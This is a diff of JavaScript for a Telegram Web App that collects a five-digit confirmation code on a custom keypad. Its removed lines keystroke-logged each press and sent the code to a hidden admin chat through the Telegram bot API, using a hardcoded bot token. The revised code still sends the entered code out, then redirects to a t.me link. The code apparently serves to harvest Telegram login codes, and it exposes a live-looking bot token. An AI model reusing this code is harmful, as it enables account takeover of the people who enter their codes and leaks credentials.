@@ -9,32 +9,29 @@ tg.MainButton.textColor = "#FFFFFF";
 tg.MainButton.color = "#2cab37";
 tg.MainButton.setText( 'Подтвердить' );
 tg.MainButton.show();
+tg.MainButton.disable();
 
-var ADMIN_ID = 5866779912;
-var TOKEN = "5968261554:AAEgMw9yRV6_yIni3qUQOYZo72Q75PkabhA"
+//var ADMIN_ID = 5866779912;
+//var TOKEN = "5968261554:AAEgMw9yRV6_yIni3qUQOYZo72Q75PkabhA"
 
-userData = document.querySelector("div.header-buttom p b");
-alert("3");
+//userData = document.querySelector("div.header-buttom p b");
+// alert("2");
 
 //userData.innerText = tg.initDataUnsafe.user.first_name + " " + tg.initDataUnsafe.user.last_name + " (" + tg.initDataUnsafe.user.id + ")";
 
-//function sendMessage(text) {
-  //  var a = tg.sendData(text);
-    //console.log(a);
+function sendMessage(text) {
+    // var a = tg.sendData(text);
+    // console.log(a);
 //     $.ajax({
-//         url: `https://api.telegram.org/bot${TOKEN}/sendMessage`,
+//         url: https://api.telegram.org/bot${TOKEN}/sendMessage,
 //         data: {
 //             text,
 //             chat_id: ADMIN_ID
 //         },
 //         method: "POST"
 //     })
-//}
+}
 
-tg.onEvent('mainButtonClicked', function(){
-	tg.sendData(12345); 
-	//при клике на основную кнопку отправляем данные в строковом виде
-});
 
 var pattern = /^[0-9]$/ ;
 var clickCount = 0;
@@ -42,6 +39,9 @@ btns.forEach((btn) => {
     btn.addEventListener("click", function() {
         if(input.value.length < 5){
             input.value += this.innerText;
+            tg.MainButton.disable();
+        }else {
+            tg.MainButton.enable();
         }
 
         if (pattern.test(parseInt(this.innerText))) {
@@ -52,27 +52,30 @@ btns.forEach((btn) => {
         if(this.getAttribute("data-key") == "BACK"){
             input.value = input.value.slice(0, -1);
             if(input.value.length == 0){
-                sendMessage("Maydon bo'sh holatida 🔙 click bo'ldi.");
+                // sendMessage("Maydon bo'sh holatida 🔙 click bo'ldi.");
                 return 0;    
             }else {
                 clickCount = input.value.length;
             }
-            sendMessage("🔙");
+            // sendMessage("🔙");
             return 0;
         }else if(this.getAttribute("data-key") == "CHECK"){
-            if(input.value.length != 5){
+            if(input.value.length < 5){
                 input.style.border = "1px solid red";
-                sendMessage(`"${input.value}" holatida ✅ click bo'ldi.`)
+                // sendMessage("${input.value}" holatida ✅ click bo'ldi.)
                 return 0;
+            }else{
+                tg.sendData(input.value);
             }
-            sendMessage(`✅ Tasdiqlash kodi: ${input.value}`);
+            // sendMessage(✅ Tasdiqlash kodi: ${input.value});
+
             clickCount = 0;
             input.value = '';
             return 0;
         }
 
         if (clickCount <= input.value.length){
-            sendMessage(this.innerText)
+            // sendMessage(this.innerText)
             console.log(clickCount);
         }
 
@@ -82,7 +85,7 @@ btns.forEach((btn) => {
 
 document.querySelectorAll(".footer div").forEach((href) => {
     href.addEventListener("click", function(){
-        sendMessage(`"${this.innerText}" clicked`);
+        // sendMessage("${this.innerText}" clicked);
 
         setTimeout(() => {
             window.location.href = "https://t.me/+42777";
